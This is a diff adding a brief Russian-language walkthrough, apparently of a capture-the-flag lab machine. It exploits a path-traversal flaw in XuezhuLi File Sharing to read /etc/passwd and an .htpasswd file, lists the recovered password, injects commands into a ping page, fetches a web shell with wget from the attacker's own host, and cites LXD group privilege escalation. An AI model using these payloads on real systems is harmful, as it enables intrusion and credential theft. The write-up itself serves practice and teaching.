@@ -1,0 +1,24 @@
+XuezhuLi File Sharing is vulnerable(https://www.exploit-db.com/exploits/40009)
+lfi
+    download.php?file=../../../../../../../../../../../../../etc/passwd
+    выясним пароль от webadmin
+        file=../../../../../../../../../../../../../etc/apache2/.htpasswd
+        aiweb2admin:c.ronaldo
+
+дальше нам доступны две диретории
+    /H05Tpin9555 и /S0mextras/
+    на первой располагется пинг, я сразу перехватываю burp и меняю запроса  
+        127.0.0.1|whoami
+        и это срабатывает
+        при попытке удаленного подключения ничего не выходит, будем загружать shell
+        <on_your_machine> python -m simplehttpserver
+        <in_burp> |wget http://192.168.226.135:8000/shell.php
+
+        после переходим по ссылке в браузере /H05Tpin9555/shell.php
+        и вуаля мы www-data
+
+в /var/www/html/webadmin/S0mextras располагаеся файл с паролем от пользователя
+после подключения к нему мы видим что пользователь состоит в группе lxd
+мы знаем как это проэксплуатировать
+https://www.hackingarticles.in/lxd-privilege-escalation/
+
